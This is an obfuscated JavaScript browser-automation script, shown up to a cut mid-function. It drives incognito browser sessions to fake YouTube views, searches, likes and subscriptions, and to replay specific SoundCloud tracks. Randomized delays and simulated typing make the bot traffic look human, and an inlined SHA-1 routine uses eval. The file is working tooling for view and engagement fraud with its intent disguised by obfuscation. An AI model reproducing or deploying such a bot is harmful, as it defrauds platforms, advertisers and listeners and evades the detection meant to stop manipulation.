function a() {
  const bn = [
    'DgLTzw91Da',
    'tw96AwXSys81lG',
    'BNrPlwfMAY10Aq',
    'st\x20ex\x20empl',
    'gSkXW5/dGcbMlZLhWQC',
    'W4bTqWRcM8oPW4FcM8k5dW',
    'fari/537.3',
    'Ahr0Chm6lY9Tzq',
    'pM5aWRroW4BcG03cO8oG',
    'AwTLieDLy2TVkq',
    'rCk5WOddKsCKnsbqW6m',
    'zahdPmo0',
    '-play-butt',
    'https://gr',
    'zs9HCg5NlcOVkG',
    'nZntqu4XDK9YvG',
    'mWddJGHrW5mezH/dQG',
    'kqddGWDBW4W',
    'BI1QyxzHC2nYAq',
    'AMLUigj0CYXIDa',
    'close',
    'WRxcLvZcPSozW7/cQ23dOu8',
    'dCoTauRdT2FdMmoZ',
    'C2L0zs96AgLODq',
    'hBytes',
    'eCofDCob'
  ];
  a = function() {
    return bn;
  };
  return a();
}
const Y = c,
  X = d,
  W = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x1 * -0xa0d + 0x80f * -0x1 + 0x121d))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1020 + 0x237d + -0x135d), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x532a + -0x2 * 0x226e + -0x3f5 * -0x1a + (0x42c4 + -0x2 * -0xf12 + 0x10 * -0x265) * random()) : await standardWaitForNetIdle(f), await wait(-0x2 * 0x1025 + 0x788 + 0x1625 * 0x2 + (0x2a * -0xac + -0xe34 + 0x517c) * random()), -0x946 * 0x1 + -0x197d + 0x22c4;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x1 * 0x201b + 0x3 * 0x778 + -0x22fb), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x69e + 0x7c0 + -0xe5d;
}
async function randomWait() {
  return await wait(0xa9c * -0x1 + 0xb * -0x2 + -0x35 * -0x92 + (-0x7 * -0x261 + -0x34d + 0x62e) * random()), -0x18eb + -0x1816 + -0x3102 * -0x1;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0xaaa + -0x24d4 + 0xc5 * 0x22, 0x5 * 0xb + 0x85 * 0x42 + 0x6 * -0x5bf), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0xb5 * -0xd7 + 0x1ad20 + 0xe3f * -0x3) * getRandomInt(0x241b + -0xdc * 0xe + -0x1811, -0x2 * -0x511 + -0x853 + -0x1ca), h)), -0xe79 + 0x4d * -0x2c + -0x1 * -0x1bb6;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x509 + -0x1da4 + -0x1 * -0x189b;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x8bd * 0x3 + -0x1 * 0x7d5 + -0x1261]['split']('\x20');
    for (let k = -0x946 + 0x22 * -0x55 + 0x1490; k < i['length']; k += -0x7f * -0x16 + -0x88 * -0x21 + 0x104 * -0x1c)
      j += i[k] * h[i[k + (-0x187f * -0x1 + -0x1bc6 + 0x348)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x117d * -0x1 + 0x2588 + -0x36ff)['map'](l => Array['from'](l['children']))['flat'](-0x1 * -0xcaa + -0xa2a + -0x27f * 0x1)['map'](l => l['childNodes'][0x1 * 0x1d9a + 0x15a9 + 0x2 * -0x19a1]['childNodes'][-0x1dff * -0x1 + -0x981 + -0x147e]['childNodes'][-0x2 * -0xa0 + -0x1056 + 0xf17 * 0x1]['childNodes'][-0xd62 + 0x2405 + -0x16a3]['childNodes'][-0x9 * -0x38f + -0x26e1 + 0x6db]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x2537 + -0x15e9 + -0xb66, -0x688 + 0xc89 * 0x3 + -0x5 * 0x24f)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x444f + -0x1 * -0x47c6 + -0x517d * 0x1);
  const h = await getMaxTime(f),
    i = Math['min']((0x657 * -0x1f + 0xfa16 + -0x11 * -0xaa3) * getRandomInt(0x1ee3 * 0x1 + -0xd * 0x1c1 + -0xb * 0xbc, 0x2 * 0xbd4 + -0x1d94 + 0x1 * 0x5f1), h);
  return await wait(i), 0x1d8e + -0x1 * -0x1b63 + -0x38f0;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0xec * -0x1 + 0x382 + -0x46e]['children'][0xd8f + -0x12bb * -0x1 + -0x1 * 0x204a]['children'][0x11 * 0xb9 + 0x5a1 * 0x1 + -0x1 * 0x11ea]['children'][-0xe * 0x1ea + 0xa86 * 0x3 + 0x1a * -0x2f]['children'][-0x348 + -0x1755 + -0x9 * -0x2f5]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1 * -0xc83 + -0x1f0d + 0x128b;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0xa5c + -0xb6 * -0x11 + -0x13 * 0x12 + (-0x2 * 0xc3 + -0x1079 + -0x1231 * -0x1) * random()
  }), await wait(0x1ce4 * 0x1 + -0x2709 + 0xc19 + (0xb2d + 0x161f * -0x1 + 0xc1e) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const R = b,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0xf4f * -0x2 + -0x2499 + -0x7 * -0xdb]['childNodes'][-0xae4 + -0x1d0a + 0x27ef]['childNodes'][-0x2082 + 0x2b * 0x9b + 0x1 * 0x67a]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0xe28 + 0xdd0 + 0x5d]['childNodes'][-0x1 * -0xd4f + -0x2f * -0x43 + -0x199c]['childNodes'][-0x1931 + 0x111b + 0x818]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + R(0x19, 'b1Ea')](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x1dbf + 0xa20 + -0x9d * -0x20),
          r = -0x182 * -0x4 + 0x1f * -0xa7 + 0xe31;
        for (let u = -0x659 + 0x1bf8 + 0x267 * -0x9; u < q['length']; u += 0x2231 + -0x744 + -0x1 * 0x1aeb)
          r += q[u] * k[q[u + (-0x1 * 0x12f6 + 0x93c + 0x1 * 0x9bb)]];
        return r;
      }(n);
  });
  await wait((0x4 * 0x1383 + -0x2734 + 0x13c0) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x1 * -0x16a4a + 0x13ed4 + 0x16 * 0xca1) * getRandomInt(0x1a10 + 0x8d8 + -0x22e7, 0x1487 + -0xe91 * 0x1 + 0x17b * -0x4), h + (-0x1aeb + -0x97c + 0x37ef));
  return await wait(i), -0x2202 * -0x1 + -0x10 * 0xce + -0x1521;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x18d5 + 0x9f + -0x409 * -0x6);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x23c4 + 0x2323 * 0x1 + 0xa1), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        const S = d;
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + S(0xc) + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x14a3 + -0xc35 + -0x34a * -0x1 + (-0x23 * -0x80 + 0x2398 + -0x626 * 0x8) * Math['random']());
    });
  }, -0x1a9 * 0x17 + -0x1f84 + 0x111 * 0x5b);
  await wait(-0xa9 * 0x119 + -0x50053 + -0x4 * -0x2936d);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x3 * 0x4185 + 0xb925 + -0x9354) * getRandomInt(0x6a6 + -0x1397 + -0x1f * -0x6b, -0xf2f + -0x21de + 0x3126)), clearInterval(h), -0x913 * -0x1 + 0x1c7d + -0x281 * 0xf;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1 * -0xd84 + -0x1d1 + -0xbb3 * 0x1;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x18fb + 0x1 * -0x9e1 + -0xf19 * 0x1;
    await randomWait();
  }
  return -0xad * 0x1b + -0x3c9 + 0x1609;
}

function fetchRandomSC() {
  return Math['random']() <= 0x159 + -0x15d + -0x2 * -0x2 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x4 * 0x48b + 0x15 * 0x16d + 0x83 * -0x17 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const T = d;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0xcd7 + -0x1 * 0x158a + 0x8b3 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x1e5 + -0x712 + 0x52d;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j[T(0x14)](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x1 * -0x7145 + -0x13e78 + 0x17cfb + getRandomInt(0x44f2 + 0x68f8 + 0x1fd * -0x3a, 0xde16 + -0xaaf * -0xa + 0x11a5 * -0xc));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x4 * -0x3d + 0x1775 + 0xb * -0x238), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x2 * 0x556 + -0x2 * 0x9e3 + -0x362 * -0x9;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1ca6 + 0x4f3 + -0x2199 * 0x1, -0x1c0e + -0x2225 * -0x1 + -0x1 * 0x5e5)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x3 * 0xb7c + -0x17 * -0x15d + 0x93 * 0x13 + floor((0x978 + 0x3 * -0x83c + 0x1324) * random()))), log('p2'), log(await s['evaluate'](() => {
        const U = b;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xa452da * 0xe5 + -0x2f1fe * -0x4bc2 + 0x10e46b * 0x312),
          -0x91d940 + 0x4c3fd3 + 0xb9f9d * 0x11,
          0x7d2 * 0x1 + 0x57 * 0x13a + -0x6bc * -0x2,
          0xa1 * 0x2e + 0x2 * -0x1352 + 0xa36
        ], y = [
          0x71d + 0xc * -0x112 + 0x5d3,
          0x13d5 + -0x12cb + 0xfa * -0x1,
          0x186c + 0x1 * -0xb8d + -0x13 * 0xad,
          -0x11d1 + -0xcb0 + 0x13 * 0x19b
        ], z = [
          'hex',
          'array',
          'digest',
          U(0x15, 'BNcK') + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0xb * -0x2bd + -0x2ee + 0x5 * -0x570)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0xec2 + -0x206a + 0x11a8; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0xa * 0x180 + 0x975 + 0x3 * -0x827) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              const V = d;
              J ? (A[-0x16ad * -0x1 + 0x10b9 * 0x1 + -0x691 * 0x6] = A[0x58 + -0x19a * 0x1 + 0x152] = A[-0x71d * -0x1 + -0xac1 + 0x3 * 0x137] = A[0x1551 + 0x3b * 0x4d + -0x270e] = A[0x218d + 0x1ad3 + 0x1 * -0x3c5d] = A[-0x1333 + 0x2 * -0x52f + 0x1 * 0x1d95] = A[-0xf * -0xa9 + 0xcb7 + 0x1699 * -0x1] = A[0x9 * 0xf0 + -0x130f + 0x221 * 0x5] = A[0x373 * 0xb + -0x6c * 0x41 + 0x11 * -0x9e] = A[-0x11a6 + -0x1da9 + -0x1 * -0x2f57] = A[0x1e44 + 0x906 + 0x305 * -0xd] = A[0x1be * 0x16 + 0xe * -0x2ab + -0xf0] = A[0x9e4 + 0x1 * 0x3d5 + -0xdae] = A[0x31c + -0x4dc + 0x5 * 0x5c] = A[-0x207 * 0x13 + -0x3e9 + 0x1d * 0x177] = A[-0x2 * -0xb11 + 0xb6 * -0x8 + -0x1 * 0x1064] = A[-0x584 * 0x7 + -0x1fd2 + 0x467d] = -0xe8c + 0x1d97 + -0xf0b, this['blocks'] = A) : this['blocks'] = [
                -0x1 * -0x1e5b + -0x10c7 + -0xd94,
                0x9 * -0x327 + 0xd7b + 0xee4,
                -0x762 + 0x19e5 + -0x1283,
                -0x209 * 0x6 + -0x21a + 0xe50,
                -0x1 * 0x1d9a + -0x47d + -0x3 * -0xb5d,
                -0x26a7 + 0x858 + 0x1e4f,
                -0x17 * 0xd6 + -0x505 * 0x1 + 0x183f,
                0xf43 * 0x1 + -0x258c + 0x1649,
                -0x2 * -0x704 + -0x847 + 0x5c1 * -0x1,
                0x8fe * -0x4 + 0xa * -0xca + 0x2bdc,
                -0x1 * 0x101e + -0x1 * 0x9cd + -0x19eb * -0x1,
                0x12b2 + 0x17 * -0xa7 + 0x15 * -0x2d,
                0x20d2 + 0x4 * 0x1eb + -0x1 * 0x287e,
                0x1 * 0x1949 + -0x5a4 + -0x13a5 * 0x1,
                -0x1b * -0x2f + 0x1adc + 0xb5 * -0x2d,
                -0x1800 + 0x4c * -0x13 + 0x1da4,
                -0x797 + 0x1e97 * 0x1 + -0x20 * 0xb8
              ], this['h0'] = -0x2c3d3d5c * -0x2 + -0x8df60246 * -0x1 + -0x1 * 0x7f2b59fd, this['h1'] = -0xfb9c522e + -0xc * -0x4ea7e85 + 0x1b06c0f7b, this['h2'] = -0x12ba3476b + -0x31abd * -0x7f7 + 0x1aba42d0e, this['h3'] = 0x1e5b20d5 + 0x1361bb9 * -0x7 + -0x5ae0a50, this['h4'] = -0x72dfebb3 + 0x43b593 * 0x35f + -0x3 * -0x1b7b3bb2, this['block'] = this['start'] = this['bytes'] = this[V(0x18)] = 0x67e + -0x1d * 0xc8 + 0x102a, this['finalized'] = this['hashed'] = -0x1 * 0x1172 + -0x6fa + 0x186c, this['first'] = -0x19a * 0x5 + -0x156d + 0x1d70;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x738 + -0x3 * -0x946 + -0x149a, O = J['length'] || -0x180f + -0x25f4 + -0x3e03 * -0x1, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x260d + 0xdb2 + 0x33bf * -0x1, P[-0x96b * 0x3 + 0x1 * -0x1879 + 0x34ba] = this['block'], P[-0x1 * -0xffb + 0x22a8 * 0x1 + -0x1 * 0x3293] = P[-0xeb7 + -0x1 * 0x5b + -0xf13 * -0x1] = P[-0x1509 + 0x1096 + 0x475] = P[0xeab + -0x727 * 0x2 + -0x5a] = P[-0xabd * -0x1 + -0x263e + 0x1b85] = P[0x33 * 0x57 + -0x1 * -0x1488 + 0x4bb * -0x8] = P[-0x8eb * -0x2 + 0x63c + -0x180c] = P[0xc5c + -0x319 + -0x93c] = P[0x260 + 0x1358 * -0x1 + 0x100 * 0x11] = P[0x1a85 + -0x2 * 0x455 + -0x11d2] = P[0x1 * -0x2081 + 0x11b9 + 0x769 * 0x2] = P[0xbf4 + -0x18b3 + 0x2 * 0x665] = P[-0x3 * 0x8bd + -0x10a * -0x1c + -0x2d5] = P[0x3 * 0x189 + -0x20d9 + 0x1c4b * 0x1] = P[0x87 * 0x17 + -0x9b3 * -0x1 + -0x15c6 * 0x1] = P[-0x1c31 + 0x1 * -0x62b + -0x3d3 * -0x9] = -0x1b * -0x53 + 0x5 * 0x3ed + 0x207 * -0xe), K) {
                    for (N = this['start']; M < O && N < 0x295 * 0xa + 0x150b * 0x1 + 0x1 * -0x2e9d; ++M)
                      P[N >> -0x1818 + -0x1588 + 0x16d1 * 0x2] |= J[M] << y[0x4 * 0x52c + 0x92 * -0x3b + -0x1 * -0xcf9 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x1081 + 0x111 * -0xe + 0x3 * -0x71; ++M)
                      (L = J['charCodeAt'](M)) < 0x3d7 * 0x7 + -0x247 * 0xf + 0x7c8 ? P[N >> -0x1652 + 0xa * -0x1c9 + 0x282e] |= L << y[-0x153 * -0xd + -0x1a26 + 0x8f2 & N++] : L < -0x16e1 * -0x1 + 0x2a * -0x28 + 0x851 * -0x1 ? (P[N >> -0x25 * -0x22 + -0x2594 + 0x11 * 0x1ec] |= (0x14cc + 0x1a6e + -0x2e7a | L >> -0x3 * -0x581 + 0x3 * 0x949 + -0x2c58) << y[0x1dbd + 0x232d + -0x40e7 * 0x1 & N++], P[N >> 0xe7e + 0x1ac6 + -0x14a1 * 0x2] |= (-0x1bad + 0x1f34 + -0x307 | -0x1b16 + -0x472 + -0x65b * -0x5 & L) << y[-0x2 * -0x3b5 + 0x6 * -0x673 + -0x1f4b * -0x1 & N++]) : L < -0x14617 + 0xf7b7 + 0x12660 || L >= 0x6ba1 * 0x1 + 0xa7d9 + -0x337a ? (P[N >> -0x239 * 0x2 + -0x21 * 0xb9 + 0x40b * 0x7] |= (-0x1 * -0x2334 + 0x1967 + -0x3bbb | L >> -0x173c + 0x65b * -0x4 + 0x1 * 0x30b4) << y[0x684 + 0xe88 * -0x2 + 0x168f & N++], P[N >> 0x1097 * 0x1 + 0x330 + -0x13c5] |= (-0x1ef3 + 0x946 + 0x162d | L >> -0x258b * -0x1 + 0x61 * -0x23 + 0x5 * -0x4da & -0x6 * -0x4da + 0x4 * 0x313 + -0x2929) << y[0x67 * 0x36 + -0x1 * 0x6bb + 0xe * -0x112 & N++], P[N >> 0x24a9 * 0x1 + 0x6a0 + -0x2b47 * 0x1] |= (-0x5dd + -0x319 + 0x976 | 0x16fc + 0x1bfa * -0x1 + -0x9 * -0x95 & L) << y[-0x324 + -0x23c4 + 0x26eb & N++]) : (L = 0x1 * -0x78ba + 0x10fbd + 0x68fd + ((-0x222c + 0xc6 * -0x2d + -0x3 * -0x1853 & L) << 0x207a + -0xa2 * 0x23 + -0xa4a | 0x837 * 0x1 + -0x1dc + 0x2 * -0x12e & J['charCodeAt'](++M)), P[N >> -0x103c * 0x2 + 0x5a7 * -0x3 + -0x5 * -0x9e3] |= (-0x1 * -0x21e8 + -0x260e + 0x3e * 0x15 | L >> 0x239e + 0x1a2 * -0xf + -0xb0e) << y[0xb59 + 0x1 * 0x21a2 + 0x1 * -0x2cf8 & N++], P[N >> 0x16bf + 0xed0 + 0x1 * -0x258d] |= (-0x7 * -0x184 + -0xa5d + 0x41 | L >> -0x822 + 0x2 * 0x5c2 + -0x2 * 0x1ab & 0x55a + 0x3 * 0x359 + 0x22a * -0x7) << y[-0x50 * -0x51 + -0x1 * -0xf17 + -0x2864 & N++], P[N >> -0x13c2 + 0x4d * -0x53 + 0x2cbb] |= (0x1c22 + -0x1178 + -0xa2a | L >> -0x1a6 * -0xb + 0x1ca2 + -0x2ebe * 0x1 & 0xbc8 * -0x2 + -0x369 + -0x86 * -0x34) << y[-0xef4 + -0x2 * 0x4eb + 0x38b * 0x7 & N++], P[N >> 0x1 * 0xf31 + 0x1190 + 0x1 * -0x20bf] |= (0x75 * -0x49 + -0x151 * 0x13 + -0x1d7 * -0x20 | -0x12c4 * -0x2 + -0x24f6 + -0x53 & L) << y[-0x18d4 + -0x1c60 + -0xef * -0x39 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x1fa3 + -0x1 * 0xc5 + -0x1e9e ? (this['block'] = P[-0x19b6 + 0x16 * 0x197 + -0x934], this['start'] = N - (0xc1 + -0x3 * -0xb15 + -0x120 * 0x1e), this['hash'](), this['hashed'] = -0x1 * -0x1532 + -0x24fa + -0x9 * -0x1c1) : this['start'] = N;
                }
                return this['bytes'] > -0x6588b4 * 0x35 + -0xd704dd47 + -0xf6051545 * -0x2 && (this['hBytes'] += this['bytes'] / (0x19db942a0 + 0x2 * 0x45c0f622 + 0x6 * -0x3189dd26) << -0x7 * -0x4f3 + 0x15a + 0x5 * -0x733, this['bytes'] = this['bytes'] % (-0x1f5301c80 + 0x61d38 * 0x4d77 + 0x11b8eaf78)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0xac2 + -0x5b7 + -0x50a;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x1 * 0x737 + -0x1ecb + 0x2612] = this['block'], J[K >> -0x150 * 0x6 + 0x13 * 0x1b0 + -0x182e] |= x[-0x47 * 0x7 + 0x1 * -0x88d + -0x1 * -0xa81 & K], this['block'] = J[0x10a + -0x3 * 0x333 + 0x89f], K >= 0x1fa + -0x190 + -0x32 && (this['hashed'] || this['hash'](), J[-0x3b7 * 0x1 + -0xa60 + 0xe17] = this['block'], J[-0x1829 + -0x19 * 0x16f + 0x3c10] = J[0xa3d + 0x12f * -0x18 + 0x122c] = J[0xf3e + -0x1981 + 0xef * 0xb] = J[-0x1df0 + 0x1206 + -0x1 * -0xbed] = J[0x239 * -0xa + -0x149 * 0xe + -0x19 * -0x19c] = J[-0x14b9 + -0x1b5e + -0xc07 * -0x4] = J[-0x3 * -0xbcb + 0x1 * 0xb33 + -0x2e8e] = J[0x5 * 0x26b + -0x1 * 0x254f + -0x193f * -0x1] = J[-0x1c72 + -0x275 * -0xe + -0x5ec] = J[0x1 * -0x2031 + -0x5 * 0x789 + 0x45e7] = J[-0x2090 + -0xb30 * -0x2 + 0x22 * 0x4d] = J[0x255d + 0xb * 0x34d + -0x135 * 0x3d] = J[-0x2502 + 0x2b * -0x13 + 0x283f] = J[-0x5 * -0x7cf + -0x1 * 0x22c + -0x24d2] = J[-0xb1 * -0x17 + 0x1 * -0xdab + 0x3 * -0xba] = J[0x801 + -0xcbb * -0x1 + -0x1 * 0x14ad] = -0x1 * 0x181e + 0x147b * -0x1 + 0x2c99), J[0x1f93 + 0xc38 + 0x2bbd * -0x1] = this['hBytes'] << -0x172b + -0x21ae + 0x38dc | this['bytes'] >>> -0x6bf + 0x970 * -0x4 + 0x2c9c, J[-0x9 * -0x263 + 0x1 * -0xa6f + -0xafd] = this['bytes'] << 0x67b + 0x7a4 + -0x387 * 0x4, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1d8 * -0x11 + 0x2a * 0x7c + -0x76 * -0x18; J < 0xc * 0x2af + -0x1072 + -0x1 * 0xf72; ++J)
